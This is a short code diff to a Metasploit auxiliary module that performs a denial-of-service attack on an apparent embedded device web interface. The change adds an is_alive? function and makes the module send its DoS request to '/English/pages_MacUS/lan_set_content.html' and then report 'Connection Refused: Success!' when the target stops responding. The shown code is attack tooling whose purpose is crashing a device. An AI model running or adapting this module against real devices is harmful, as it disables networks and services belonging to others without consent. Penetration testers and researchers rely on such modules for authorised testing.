@@ -32,6 +32,15 @@ class Metasploit3 < Msf::Auxiliary
 			'DisclosureDate' => 'Jun 18 2013'))
 	end
 
+        def is_alive?
+		res = send_request_raw({
+			'method'	=>	'GET',
+			'uri'		=>	'/',
+		},10)
+		
+		return !res.nil?
+        end
+
 	def run
 
 		begin
@@ -71,8 +80,14 @@ class Metasploit3 < Msf::Auxiliary
 		send_request_cgi({
 			'method'	=>	'GET',
 			'uri'		=>	'/English/pages_MacUS/lan_set_content.html'
-		}) #default timeout, we don't care about the response
-		print_status("DoS payload sent to #{rhost}:#{rport}. Check the device for responsiveness.")
+		},5) #default timeout, we don't care about the response
+
+		# Check to see if it worked or not
+		if is_alive?
+                        print_error("#{rhost}:#{rport} - Server is still alive")
+                else
+                        print_good("#{rhost}:#{rport} - Connection Refused: Success!")
+                end
 
 	end
 end
